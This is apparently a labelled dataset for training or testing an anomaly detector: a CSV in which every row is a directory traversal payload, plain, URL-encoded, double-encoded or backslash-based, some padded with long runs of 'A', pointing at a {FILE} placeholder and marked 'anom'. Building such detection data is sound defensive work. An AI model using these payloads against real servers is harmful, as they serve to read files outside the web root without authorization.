payload,label
/..%2f..%2f..%2f..%2f{FILE},anom
/..%2f..%2f..%2f..%2f..%2f{FILE},anom
/..%2f..%2f..%2f..%2f..%2f..%2f{FILE},anom
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE},anom
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE},anom
/%2e%2e/{FILE},anom
/%2e%2e/%2e%2e/{FILE},anom
/%2e%2e/%2e%2e/%2e%2e/{FILE},anom
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},anom
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},anom
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},anom
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},anom
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},anom
/%2e%2e%2f{FILE},anom
/%2e%2e%2f%2e%2e%2f{FILE},anom
/%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},anom
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},anom
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},anom
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},anom
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},anom
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},anom
/..%252f{FILE},anom
/..%252f..%252f{FILE},anom
/..%252f..%252f..%252f{FILE},anom
/..%252f..%252f..%252f..%252f{FILE},anom
/..%252f..%252f..%252f..%252f..%252f{FILE},anom
/..%252f..%252f..%252f..%252f..%252f..%252f{FILE},anom
/..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE},anom
/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE},anom
/%252e%252e/{FILE},anom
/%252e%252e/%252e%252e/{FILE},anom
/%252e%252e/%252e%252e/%252e%252e/{FILE},anom
/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},anom
/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},anom
/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},anom
/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},anom
/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},anom
/%252e%252e%252f{FILE},anom
/%252e%252e%252f%252e%252e%252f{FILE},anom
/%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},anom
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},anom
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},anom
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},anom
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},anom
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},anom
/..\{FILE},anom
/..\..\{FILE},anom
/..\..\..\{FILE},anom
/..\..\..\..\{FILE},anom
/..\..\..\..\..\{FILE},anom
/..\..\..\..\..\..\{FILE},anom
/..\..\..\..\..\..\..\{FILE},anom
/..\..\..\..\..\..\..\..\{FILE},anom
/..%5c{FILE},anom
/..%5c..%5c{FILE},anom
/..%5c..%5c..%5c{FILE},anom
/..%5c..%5c..%5c..%5c{FILE},anom
/..%5c..%5c..%5c..%5c..%5c{FILE},anom
/..%5c..%5c..%5c..%5c..%5c..%5c{FILE},anom
/..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE},anom
/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE},anom
/%2e%2e\{FILE},anom
/%2e%2e\%2e%2e\{FILE},anom
/%2e%2e\%2e%2e\%2e%2e\{FILE},anom
/%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},anom
/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},anom
/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},anom
/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},anom
/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},anom
/%2e%2e%5c{FILE},anom
/%2e%2e%5c%2e%2e%5c{FILE},anom
/%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},anom
/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},anom
/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},anom
/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},anom
/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},anom
/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},anom
/..%255c{FILE},anom
/..%255c..%255c{FILE},anom
/..%255c..%255c..%255c{FILE},anom
/..%255c..%255c..%255c..%255c{FILE},anom
/..%255c..%255c..%255c..%255c..%255c{FILE},anom
/..%255c..%255c..%255c..%255c..%255c..%255c{FILE},anom
/..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE},anom
/..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE},anom
/%252e%252e\{FILE},anom
/%252e%252e\%252e%252e\{FILE},anom
/%252e%252e\%252e%252e\%252e%252e\{FILE},anom
/%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},anom
/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},anom
/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},anom
/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},anom
/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},anom
/%252e%252e%255c{FILE},anom
/%252e%252e%255c%252e%252e%255c{FILE},anom
/%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},anom
/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},anom
/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},anom
/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},anom
/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},anom
/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},anom
/../{FILE},anom
/../../{FILE},anom
/../../../{FILE},anom
/../../../../{FILE},anom
/../../../../../{FILE},anom
/../../../../../../{FILE},anom
/../../../../../../../{FILE},anom
/../../../../../../../../{FILE},anom
/..%2f{FILE},anom
/..%2f..%2f{FILE},anom
/..%2f..%2f..%2f{FILE},anom
/..%2f..%2f..%2f..%2f{FILE},anom
/..%2f..%2f..%2f..%2f..%2f{FILE},anom
/..%2f..%2f..%2f..%2f..%2f..%2f{FILE},anom
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE},anom
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE},anom
/%2e%2e/{FILE},anom
/%2e%2e/%2e%2e/{FILE},anom
/%2e%2e/%2e%2e/%2e%2e/{FILE},anom
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},anom
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},anom
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},anom
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},anom
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},anom
/%2e%2e%2f{FILE},anom
/%2e%2e%2f%2e%2e%2f{FILE},anom
/%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},anom
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},anom
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},anom
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},anom
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},anom
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},anom
/..%252f{FILE},anom
/..%252f..%252f{FILE},anom
/..%252f..%252f..%252f{FILE},anom
/..%252f..%252f..%252f..%252f{FILE},anom
/..%252f..%252f..%252f..%252f..%252f{FILE},anom
/..%252f..%252f..%252f..%252f..%252f..%252f{FILE},anom
/..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE},anom
/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE},anom
/%252e%252e/{FILE},anom
/%252e%252e/%252e%252e/{FILE},anom
/%252e%252e/%252e%252e/%252e%252e/{FILE},anom
/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},anom
/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},anom
/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},anom
/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},anom
/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},anom
/%252e%252e%252f{FILE},anom
/%252e%252e%252f%252e%252e%252f{FILE},anom
/%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},anom
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},anom
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},anom
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},anom
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},anom
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},anom
/..\{FILE},anom
/..\..\{FILE},anom
/..\..\..\{FILE},anom
/..\..\..\..\{FILE},anom
/..\..\..\..\..\{FILE},anom
/..\..\..\..\..\..\{FILE},anom
/..\..\..\..\..\..\..\{FILE},anom
/..\..\..\..\..\..\..\..\{FILE},anom
/..%5c{FILE},anom
/..%5c..%5c{FILE},anom
/..%5c..%5c..%5c{FILE},anom
/..%5c..%5c..%5c..%5c{FILE},anom
/..%5c..%5c..%5c..%5c..%5c{FILE},anom
/..%5c..%5c..%5c..%5c..%5c..%5c{FILE},anom
/..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE},anom
/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE},anom
/%2e%2e\{FILE},anom
/%2e%2e\%2e%2e\{FILE},anom
/%2e%2e\%2e%2e\%2e%2e\{FILE},anom
/%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},anom
/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},anom
/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},anom
/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},anom
/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},anom
/%2e%2e%5c{FILE},anom
/%2e%2e%5c%2e%2e%5c{FILE},anom
/%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},anom
/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},anom
/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},anom
/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},anom
/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},anom
/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},anom
/..%255c{FILE},anom
/..%255c..%255c{FILE},anom
/..%255c..%255c..%255c{FILE},anom
/..%255c..%255c..%255c..%255c{FILE},anom
/..%255c..%255c..%255c..%255c..%255c{FILE},anom
/..%255c..%255c..%255c..%255c..%255c..%255c{FILE},anom
/..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE},anom
/..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE},anom
/%252e%252e\{FILE},anom
/%252e%252e\%252e%252e\{FILE},anom
/%252e%252e\%252e%252e\%252e%252e\{FILE},anom
/%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},anom
/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},anom
/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},anom
/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},anom
/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},anom
/%252e%252e%255c{FILE},anom
/%252e%252e%255c%252e%252e%255c{FILE},anom
/%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},anom
/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},anom
/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},anom
/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},anom
/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},anom
/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},anom
/\../{FILE},anom
/\../\../{FILE},anom
/\../\../\../{FILE},anom
/\../\../\../\../{FILE},anom
/\../\../\../\../\../{FILE},anom
/\../\../\../\../\../\../{FILE},anom
/\../\../\../\../\../\../\../{FILE},anom
/\../\../\../\../\../\../\../\../{FILE},anom
//..\{FILE},anom
//..\/..\{FILE},anom
//..\/..\/..\{FILE},anom
//..\/..\/..\/..\{FILE},anom
//..\/..\/..\/..\/..\{FILE},anom
//..\/..\/..\/..\/..\/..\{FILE},anom
//..\/..\/..\/..\/..\/..\/..\{FILE},anom
//..\/..\/..\/..\/..\/..\/..\/..\{FILE},anom
/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../{FILE},anom
/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../{FILE},anom
/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../{FILE},anom
/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../{FILE},anom
/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../{FILE},anom
